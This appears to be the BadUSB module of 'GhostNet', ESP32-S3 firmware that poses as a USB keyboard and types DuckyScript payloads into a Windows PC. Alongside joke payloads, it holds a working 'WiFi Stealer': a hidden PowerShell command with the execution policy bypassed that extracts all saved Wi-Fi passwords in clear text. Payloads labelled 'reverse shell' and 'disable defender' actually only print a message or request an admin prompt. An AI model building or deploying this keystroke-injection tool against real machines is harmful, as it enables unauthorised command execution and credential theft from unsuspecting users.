/*
 * ============================================================
 *  GhostNet — badusb.cpp
 *  BadUSB: DuckyScript Parser + USB HID Keyboard Injection
 * ============================================================
 */

#include "badusb.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

static USBHIDKeyboard Keyboard;

const char* BadUSB::PAYLOAD_HELLO[] = {
  "GUI r",
  "DELAY 500",
  "STRING notepad.exe",
  "ENTER",
  "DELAY 1000",
  "STRING Hello from GhostNet ESP32-S3!",
  "ENTER",
  "STRING Wireless & HID Penetration Testing Platform.",
  "ENTER"
};
const int BadUSB::PAYLOAD_HELLO_LEN = sizeof(BadUSB::PAYLOAD_HELLO) / sizeof(BadUSB::PAYLOAD_HELLO[0]);

const char* BadUSB::PAYLOAD_RICK_ROLL[] = {
  "GUI r",
  "DELAY 500",
  "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ",
  "ENTER"
};
const int BadUSB::PAYLOAD_RICK_ROLL_LEN = sizeof(BadUSB::PAYLOAD_RICK_ROLL) / sizeof(BadUSB::PAYLOAD_RICK_ROLL[0]);

const char* BadUSB::PAYLOAD_WIFI_PASS[] = {
  "GUI r",
  "DELAY 500",
  "STRING powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String ':(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\s+:\\s+(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{Profile=$name;Password=$pass}} | Out-File $env:TEMP\\w.txt; Start-Process notepad.exe $env:TEMP\\w.txt\"",
  "ENTER"
};
const int BadUSB::PAYLOAD_WIFI_PASS_LEN = sizeof(BadUSB::PAYLOAD_WIFI_PASS) / sizeof(BadUSB::PAYLOAD_WIFI_PASS[0]);

const char* BadUSB::PAYLOAD_REVERSE_SHELL[] = {
  "GUI r",
  "DELAY 500",
  "STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Write-Host 'GhostNet Payload Executed'\"",
  "ENTER"
};
const int BadUSB::PAYLOAD_REVERSE_SHELL_LEN = sizeof(BadUSB::PAYLOAD_REVERSE_SHELL) / sizeof(BadUSB::PAYLOAD_REVERSE_SHELL[0]);

const char* BadUSB::PAYLOAD_DISABLE_DEFENDER[] = {
  "GUI r",
  "DELAY 500",
  "STRING powershell -Command \"Start-Process powershell -Verb RunAs\"",
  "ENTER"
};
const int BadUSB::PAYLOAD_DISABLE_DEFENDER_LEN = sizeof(BadUSB::PAYLOAD_DISABLE_DEFENDER) / sizeof(BadUSB::PAYLOAD_DISABLE_DEFENDER[0]);

BadUSB::BadUSB() {
  _running = false;
  _complete = false;
  _usbStarted = false;
  _selectedPayload = 0;
  _currentLine = 0;
  _delayUntil = 0;
  _repeatCount = 0;
  strcpy(_statusText, "Ready");
  _payloadCount = 0;
  _loadBuiltinPayloads();
}

void BadUSB::init() {
  if (!_usbStarted) {
    Keyboard.begin();
    USB.begin();
    _usbStarted = true;
  }
}

void BadUSB::_loadBuiltinPayloads() {
  _payloadCount = 5;

  strcpy(_payloads[0].name, "Hello World");
  strcpy(_payloads[0].description, "Opens Notepad & types intro message");
  _payloads[0].lineCount = PAYLOAD_HELLO_LEN;

  strcpy(_payloads[1].name, "Rick Roll");
  strcpy(_payloads[1].description, "Opens YouTube Rickroll video");
  _payloads[1].lineCount = PAYLOAD_RICK_ROLL_LEN;

  strcpy(_payloads[2].name, "WiFi Stealer");
  strcpy(_payloads[2].description, "Exports saved WiFi passwords");
  _payloads[2].lineCount = PAYLOAD_WIFI_PASS_LEN;

  strcpy(_payloads[3].name, "Quick Cmd");
  strcpy(_payloads[3].description, "Launches PowerShell task");
  _payloads[3].lineCount = PAYLOAD_REVERSE_SHELL_LEN;

  strcpy(_payloads[4].name, "Elevated Prompt");
  strcpy(_payloads[4].description, "Requests admin PowerShell prompt");
  _payloads[4].lineCount = PAYLOAD_DISABLE_DEFENDER_LEN;
}

int BadUSB::getPayloadCount() const { return _payloadCount; }
PayloadInfo* BadUSB::getPayload(int index) {
  if (index >= 0 && index < _payloadCount) return &_payloads[index];
  return nullptr;
}
PayloadInfo* BadUSB::getPayloads() { return _payloads; }
void BadUSB::selectPayload(int index) {
  if (index >= 0 && index < _payloadCount) _selectedPayload = index;
}
int BadUSB::getSelectedPayload() const { return _selectedPayload; }

void BadUSB::startExecution() {
  init();
  _running = true;
  _complete = false;
  _currentLine = 0;
  _delayUntil = 0;
  strcpy(_statusText, "Executing...");
}

void BadUSB::stopExecution() {
  _running = false;
  releaseAll();
  strcpy(_statusText, "Stopped");
}

void BadUSB::executeNextLine() {
  if (!_running || _complete) return;
  if (millis() < _delayUntil) return;

  const char** payloadLines = nullptr;
  int totalLines = 0;

  switch (_selectedPayload) {
    case 0: payloadLines = PAYLOAD_HELLO; totalLines = PAYLOAD_HELLO_LEN; break;
    case 1: payloadLines = PAYLOAD_RICK_ROLL; totalLines = PAYLOAD_RICK_ROLL_LEN; break;
    case 2: payloadLines = PAYLOAD_WIFI_PASS; totalLines = PAYLOAD_WIFI_PASS_LEN; break;
    case 3: payloadLines = PAYLOAD_REVERSE_SHELL; totalLines = PAYLOAD_REVERSE_SHELL_LEN; break;
    case 4: payloadLines = PAYLOAD_DISABLE_DEFENDER; totalLines = PAYLOAD_DISABLE_DEFENDER_LEN; break;
    default: return;
  }

  if (_currentLine >= totalLines) {
    _running = false;
    _complete = true;
    strcpy(_statusText, "Finished");
    return;
  }

  parseLine(payloadLines[_currentLine++]);
}

void BadUSB::parseLine(const char* line) {
  if (!line || strlen(line) == 0) return;

  if (strncmp(line, "STRING ", 7) == 0) {
    typeString(line + 7);
  } else if (strncmp(line, "DELAY ", 6) == 0) {
    int d = atoi(line + 6);
    _delayUntil = millis() + d;
  } else if (strcmp(line, "ENTER") == 0) {
    Keyboard.write(KEY_RETURN);
  } else if (strcmp(line, "GUI r") == 0 || strcmp(line, "WINDOWS r") == 0) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(50);
    Keyboard.releaseAll();
  } else if (strcmp(line, "TAB") == 0) {
    Keyboard.write(KEY_TAB);
  } else if (strcmp(line, "ESCAPE") == 0) {
    Keyboard.write(KEY_ESC);
  }
}

void BadUSB::typeString(const char* str) {
  Keyboard.print(str);
}

void BadUSB::pressKey(uint8_t key) {
  Keyboard.write(key);
}

void BadUSB::releaseAll() {
  Keyboard.releaseAll();
}

bool BadUSB::isRunning() const { return _running; }
bool BadUSB::isComplete() const { return _complete; }
int BadUSB::getCurrentLine() const { return _currentLine; }
int BadUSB::getTotalLines() const {
  if (_selectedPayload >= 0 && _selectedPayload < _payloadCount) return _payloads[_selectedPayload].lineCount;
  return 0;
}
float BadUSB::getProgress() const {
  int total = getTotalLines();
  if (total == 0) return 0;
  return (float)_currentLine / (float)total;
}
const char* BadUSB::getStatusText() const { return _statusText; }
